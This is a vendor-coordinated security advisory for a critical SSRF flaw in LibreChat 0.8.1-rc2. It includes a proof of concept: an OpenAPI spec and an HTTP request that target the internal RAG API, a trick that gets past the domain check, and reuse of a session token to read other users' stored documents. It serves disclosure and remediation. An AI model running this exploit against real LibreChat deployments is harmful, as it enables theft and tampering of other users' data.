# LibreChat Server-Side Request Forgery #

## Vulnerability Overview ##

LibreChat version 0.8.1-rc2 is prone to a server-side request forgery (SSRF)
vulnerability due to missing restrictions of the Actions feature in the
default configuration. This allows attackers to interact with arbitrary
third-party HTTP services, for example the internal RAG API.

* **Identifier**            : SBA-ADV-20251205-02
* **Type of Vulnerability** : Server-Side Request Forgery (SSRF)
* **Software/Product Name** : [LibreChat](https://github.com/danny-avila/LibreChat)
* **Vendor**                : [LibreChat](https://www.librechat.ai/)
* **Affected Versions**     : 0.8.1-rc2
* **Fixed in Version**      : 0.8.2-rc2
* **CVE ID**                : CVE-2025-69222
* **CVSSv3 Vector**         : CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:L
* **CVSSv3 Base Score**     : 9.1 (Critical)

## Vendor Description ##

> LibreChat is the ultimate open-source app for all your AI conversations,
> fully customizable and compatible with any AI provider — all in one sleek
> interface.

Source: <https://www.librechat.ai/>

## Impact ##

An authenticated attacker can interact with arbitrary third-party HTTP
services by exploiting the vulnerability documented in this advisory. Since
the attacker can define the HTTP services via an OpenAPI specification, it is
possible to use various HTTP methods and supply arbitrary parameters in the
HTTP query string and HTTP body. It is also possible to set arbitrary HTTP
headers. This might lead to manipulation of internal services accessible by
the server running the affected software. For example, this allows access to
the internal RAG API that is usually not exposed. Moreover, an attacker can
send malicious requests to external services, while the server running the
affected software appears as the source of the attack.

## Vulnerability Description ##

LibreChat allows the configuration of agents that have a predefined set of
instructions and context. This also includes actions an agent can execute on
remote services. The actions are defined using an OpenAPI specification and
support arbitrary HTTP and HTTPS services. In addition to specifying the
endpoints with their HTTP methods and parameters via the OpenAPI
specification, it is possible to set up typical authentication methods
including custom HTTP headers. By default, there are no restrictions on which
specific services are accessible. Therefore, it is also possible to access the
RAG API that is part of the default Docker Compose setup.

## Proof of Concept ##

Our setup uses the default configuration, which allows users to create their
own agents and use their own or shared agents:

![Role permissions of normal users for agents](images/user_role_permissions.png)

Therefore, a normal user like `user-3.pentest@example.com` can exploit the
vulnerability. We can create a new agent as this user and configure the
actions.

### Accessing the Internal RAG API ###

For example, it is possible to query the real OpenAPI specification of the RAG
API by setting the following basic OpenAPI specification:

```yml
servers:
  - url: http://rag_api:8000/

paths:
  /:
    get: {}
  /health:
    get: {}
  /openapi.json:
    get: {}
```

Due to a bug in an internal verification routine, the above OpenAPI
specification cannot be set directly via the UI. Setting it via the UI leads
to the following error, since it uses the `http` protocol and not the `https`
protocol:

```text
Domain mismatch: The domain in the OpenAPI spec does not match the provided domain
```

However, it is possible to overcome this bug, by manipulating the
user-specified `domain` parameter to also include the `http://` protocol.
With the following HTTP request it is possible to set the above OpenAPI
specification:

```http
POST /api/agents/actions/agent_bjF4AbO0_KR8xE2YVztfx HTTP/1.1
Host: librechat.example.com
Authorization: Bearer eyJ[...].vMl_PPzz6ZzGT6nyz5uTqQlseNJ_xqS6dF1x6WaAiC4
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Content-Type: application/json
Connection: keep-alive
[...]

{"action_id":"hDJETkgXGX2z0krVHw8ll","metadata":{"raw_spec":"servers:\n  - url: http://rag_api:8000/\n\npaths:\n  /:\n    get: {}\n  /health:\n    get: {}\n  /openapi.json:\n    get: {}","domain":"http://rag_api"},"functions":[{"type":"function","function":{"name":"get_","description":"","parameters":{"type":"object","properties":{},"required":[]}}},{"type":"function","function":{"name":"get_health","description":"","parameters":{"type":"object","properties":{},"required":[]}}},{"type":"function","function":{"name":"get_openapijson","description":"","parameters":{"type":"object","properties":{},"required":[]}}}]}

HTTP/1.1 200 OK
x-robots-tag: noindex
access-control-allow-origin: *
content-type: application/json; charset=utf-8
content-length: 12025
etag: W/"2ef9-TbwGERH72lCWpK6d1n7VxV9AUbM"
date: Fri, 05 Dec 2025 08:55:02 GMT
alt-svc: h3=":443"; ma=2592000
x-cache: Miss

[{"_id":"693011113605e9492b1b8217","id":"agent_bjF4AbO0_KR8xE2YVztfx","name":"PentestAgent2","description":"","instructions":"","provider":"azureOpenAI","model":"gpt-4.1","model_parameters":{"web_search":false},"artifacts":"","tools":["get__action_aHR0cDovLz","get_health_action_aHR0cDovLz","get__action_ODM5cTQweG","get_health_action_ODM5cTQweG","get__action_djN6ZDRueD","get_health_action_djN6ZDRueD","get__action_127---0---0---1","get_health_action_127---0---0---1","get__action_aHR0cDovL2","get_health_action_aHR0cDovL2","get__action_aHR0cDovL3","get_health_action_aHR0cDovL3","get_openapijson_action_aHR0cDovL3"],"tool_kwargs":[],"author":"692842b57463247ff7f7d37e","agent_ids":[],"edges":[],"conversation_starters":[],"projectIds":[],"versions":[...],"category":"general","support_contact":{"name":"","email":""},"is_promoted":false,"createdAt":"2025-12-03T10:29:37.107Z","updatedAt":"2025-12-05T08:55:02.650Z","__v":0,"actions":["aHR0cDovL3_action_hDJETkgXGX2z0krVHw8ll"],"end_after_tools":false,"hide_sequential_outputs":false},{"_id":"69301189189a78f0bd172dce","action_id":"hDJETkgXGX2z0krVHw8ll","__v":0,"agent_id":"agent_bjF4AbO0_KR8xE2YVztfx","metadata":{"raw_spec":"servers:\n  - url: http://rag_api:8000/\n\npaths:\n  /:\n    get: {}\n  /health:\n    get: {}\n  /openapi.json:\n    get: {}","domain":"http://rag_api"},"type":"action_prototype","user":"692842b57463247ff7f7d37e"}]
```

Now it is possible to query the OpenAPI specification using the agent:

![Querying the OpenAPI specification of the internal RAG API](images/ssrf_rag_api_openapi.png)

Next, we use the full OpenAPI specification to call further endpoints of the
RAG API. We modify the full OpenAPI specification slightly to include the
server URL and shorten some operation names to pass the LibreChat OpenAPI
validation. Moreover, in the default Docker Compose setup, the RAG API
requires authentication. However, since the JWT secret is shared, it is
possible to use a LibreChat session token (see [1]). We simply use the HTTP
session token from our current LibreChat session and set the following custom
authentication header:

```http
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY5Mjg0MmI1NzQ2MzI0N2ZmN2Y3ZDM3ZSIsInVzZXJuYW1lIjoidXNlci0zLnBlbnRlc3RAZXhhbXBsZS5jb20iLCJwcm92aWRlciI6Im9wZW5pZCIsImVtYWlsIjoidXNlci0zLnBlbnRlc3RAZXhhbXBsZS5jb20iLCJpYXQiOjE3NjQ5MjgzNDMsImV4cCI6MTc2NDkyOTI0M30.kTsGGcNVbUscq_4Tuj_cBn2VvOeDZwmmY7PCWkINQWg
```

Now, we can use the agent to query all stored document IDs:

![Querying all stored document IDs from the internal RAG API](images/ssrf_rag_api_document_ids.png)

Further, we can query all stored documents from the internal RAG API.
For example, we can query a document that was uploaded by another user:

![Retrieving the content of a specific document from the RAG API](images/ssrf_rag_api_document.png)

This vulnerability also allows deleting all existing documents within the RAG
API and possibly also replace existing documents with manipulated documents.

### Accessing Other Services ###

The vulnerability does not only allow access to the RAG API, but also to
arbitrary other internal or external services. The impact depends on the
concrete environment and ranges from information disclosure of technical
implementation details to full server compromise.

## Recommended Countermeasures ##

We recommend updating to LibreChat version 0.8.2-rc2 or later and set the
option `actions.allowedDomains` to a non-empty list. Moreover, the allowed
entries should explicitly specify the protocol and port.

It is already possible to restrict access using the `actions.allowedDomains`
option [2]. However, when `allowedDomains` is empty (which is the default
configuration), all targets are allowed. We recommend disallowing all targets
when `allowedDomains` is empty. This should also be the default configuration
to not expose the RAG API in the recommended Docker Compose setup.

Moreover, the current form of the `actions.allowedDomains` option, does not
allow restriction of the protocol scheme and the port. Therefore, if a domain
is allowed, LibreChat allows access to all HTTP and HTTPS services on all
ports of the domain. We recommend allowing stricter restrictions also
including the protocol (scheme) and the port.

Also, the system should not follow redirections, or at least check them
against the *allowlist* as well.

## Timeline ##

* `2025-12-05` identification of vulnerability in version 0.8.1-rc2
* `2025-12-17` disclosed vulnerability to vendor
* `2025-12-17` initial vendor response
* `2025-12-29` vendor confirmed vulnerability
* `2025-12-29` GitHub assigned CVE-2025-69222
* `2026-01-07` vendor released fix in version 0.8.2-rc2
* `2026-01-07` public disclosure

## References ##

1. SBA Research Security Advisory. SBA-ADV-20251205-01 LibreChat RAG API
   Authentication Bypass:
   <TODO>
2. LibreChat Docs. Actions Object Structure. allowedDomains:
   <https://www.librechat.ai/docs/configuration/librechat_yaml/object_structure/actions#alloweddomains>
3. OAWSP Top 10. A10:2021 Server-Side Request Forgery (SSRF):
   <https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/>
4. OWASP Cheat Sheet Series. Server-Side Request Forgery Prevention Cheat
   Sheet:
   <https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html>
5. OWASP Web Security Testing Guide (WSTG) v4.2. Testing for Server-Side
   Request Forgery:
   <https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery>
6. Common Weakness Enumeration. CWE-918 Server-Side Request Forgery (SSRF):
   <https://cwe.mitre.org/data/definitions/918.html>
7. GitHub Security Advisory:
   <https://github.com/danny-avila/LibreChat/security/advisories/GHSA-rgjq-4q58-m3q8>

## Credits ##

* Lisa Gnedt ([SBA Research](https://www.sba-research.org/))
* Michael Koppmann ([SBA Research](https://www.sba-research.org/))

The discovery of this vulnerability was made possible through support from
[CYSSDE](https://cyssde.eu/) and the European Union.

![CYSSDE](images/cyssde.png)
